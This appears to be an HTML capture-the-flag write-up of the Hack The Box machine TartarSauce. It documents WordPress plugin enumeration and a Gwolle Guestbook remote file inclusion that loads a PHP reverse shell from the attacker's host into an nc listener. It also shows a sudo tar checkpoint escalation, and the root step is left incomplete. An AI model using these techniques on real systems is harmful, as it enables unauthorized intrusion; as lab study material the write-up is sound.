@@ -1,0 +1,107 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>TartarSauce &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>TartarSauce</h1>
+    <div class="meta">Target: <code>10.10.14.158</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">WordPress</span><span class="tag">WPScan</span><span class="tag">RFI</span><span class="tag">CVE</span><span class="tag">sudo</span><span class="tag">tar</span><span class="tag">GTFOBins</span><span class="tag">pspy</span><span class="tag">cron</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#robots-txt">robots.txt</a><a class="lvl3" href="#directory-brute-force">Directory Brute Force</a><a class="lvl3" href="#wpscan-plugin-enumeration">WPScan Plugin Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#gwolle-guestbook-1-5-3-remote-file-inclusion-edb-38861">Gwolle Guestbook 1.5.3, Remote File Inclusion (EDB-38861)</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#www-data-onuma-sudo-tar">www-data → onuma (sudo tar)</a><a class="lvl3" href="#onuma-root-backuperer-cron-in-progress">onuma → root (backuperer cron, In Progress)</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>TartarSauce is a medium Linux box with a robots.txt that looks like a red herring until Gobuster finds a WordPress instance tucked inside <code>/webservices/wp/</code>. WPScan identifies a guestbook plugin that faked its version number to evade scanners, masking a Real File Inclusion (RFI) vulnerability. That gives a shell as <code>www-data</code>. A sudo rule lets <code>www-data</code> run <code>tar</code> as user <code>onuma</code>, and a GTFOBins tar checkpoint trick escalates to that account. A root cron job runs a custom script called <code>backuperer</code>, but the notes stop there.</p>
+<blockquote>
+<p><strong>Note:</strong> these notes are incomplete, the path covers initial access and lateral movement to <code>onuma</code>; the <code>backuperer</code> cron-based root escalation is identified via <code>pspy</code> but not documented past detection; written as in-progress.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
+| http-robots.txt: 5 disallowed entries
+| /webservices/tar/tar/source/
+| /webservices/monstra-3.0.4/ /webservices/easy-file-uploader/
+|_/webservices/developmental/ /webservices/phpmyadmin/
+</code></pre>
+<h3 id="robots-txt">robots.txt</h3>
+<p>The five disallowed entries all 404. None of the listed paths resolve.</p>
+<h3 id="directory-brute-force">Directory Brute Force</h3>
+<p>Gobuster against <code>/webservices/</code> finds one valid directory:</p>
+<pre><code class="language-sh">gobuster dir -k -u http://10.129.31.44/webservices/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -t 30
+
+/wp     (Status: 301) [--&gt; http://10.129.31.44/webservices/wp/]
+</code></pre>
+<p>The WordPress instance loads but shows "under construction." An "Uncategorized" link resolves to the full FQDN, so <code>tartarsauce.htb</code> goes into <code>/etc/hosts</code>.</p>
+<h3 id="wpscan-plugin-enumeration">WPScan Plugin Enumeration</h3>
+<pre><code class="language-sh">sudo wpscan --url http://10.129.31.44/webservices/wp/ --enumerate p --plugins-detection aggressive --api-token &lt;token&gt;
+</code></pre>
+<p>The <code>gwolle-gb</code> (Gwolle Guestbook) plugin is installed. Its <code>readme.txt</code> changelog contains a deliberate misdirection:</p>
+<pre><code>= 2.3.10 =
+* 2018-2-12
+* Changed version from 1.5.3 to 2.3.10 to trick wpscan ;D
+</code></pre>
+<p>The actual version is 1.5.3, which has a published RFI exploit.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="gwolle-guestbook-1-5-3-remote-file-inclusion-edb-38861">Gwolle Guestbook 1.5.3, Remote File Inclusion (EDB-38861)</h3>
+<p>The plugin's <code>ajaxresponse.php</code> includes a remote <code>wp-load.php</code> from an attacker-controlled URL:</p>
+<pre><code>http://10.129.31.44/webservices/wp/wp-content/plugins/gwolle-gb/frontend/captcha/ajaxresponse.php?abspath=http://10.10.14.158/
+</code></pre>
+<p>Proof of callback, the server fetches <code>/wp-load.php</code> from the attacker's HTTP server:</p>
+<pre><code class="language-sh">python3 -m http.server 80
+10.129.32.28 - - &quot;GET /wp-load.php HTTP/1.0&quot; 404
+</code></pre>
+<blockquote>
+<p><strong>How RFI works here:</strong> the plugin constructs a path like <code>$abspath . 'wp-load.php'</code> and passes it to <code>include()</code>. When <code>allow_url_include</code> is on, PHP fetches and executes the remote file. Naming the reverse shell payload <code>wp-load.php</code> satisfies the include path.</p>
+</blockquote>
+<p>Rename a PHP reverse shell to <code>wp-load.php</code> in the HTTP server directory and re-trigger:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 53
+connect to [10.10.14.158] from (UNKNOWN) [10.129.32.28] 44418
+Linux TartarSauce 4.15.0-041500-generic
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ whoami
+www-data
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="www-data-onuma-sudo-tar">www-data → onuma (sudo tar)</h3>
+<p><code>www-data</code> can run <code>tar</code> as <code>onuma</code> without a password. The GTFOBins tar checkpoint technique abuses tar's <code>--checkpoint-action</code> flag to execute an arbitrary command at each checkpoint:</p>
+<pre><code class="language-sh">sudo -u onuma tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
+</code></pre>
+<p>This spawns a shell as <code>onuma</code>.</p>
+<blockquote>
+<p><strong>Why tar checkpoints execute code:</strong> tar fires an action after processing a set number of records. The <code>exec=</code> action runs a shell command. Since tar is running as <code>onuma</code> under sudo, the exec'd shell inherits that user context.</p>
+</blockquote>
+<h3 id="onuma-root-backuperer-cron-in-progress">onuma → root (backuperer cron, In Progress)</h3>
+<p><code>pspy</code> shows a root-owned cron job firing every 5 minutes:</p>
+<pre><code>CMD: UID=0  PID=24065  | /bin/bash /usr/sbin/backuperer
+</code></pre>
+<blockquote>
+<p><strong>Note:</strong> these notes are incomplete, the <code>backuperer</code> script analysis and root exploitation steps are not documented; written as in-progress.</p>
+</blockquote>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>robots.txt disallowed entries are often decoys.</strong> The real content was found by Gobuster, not by visiting the listed paths.</li>
+<li><strong>Plugin version forgery fools automated scanners.</strong> Manual review of readme changelogs caught what WPScan missed.</li>
+<li><strong>sudo GTFOBins entries cover many common binaries.</strong> <code>tar --checkpoint-action=exec=</code> is reliable and requires no uploads.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
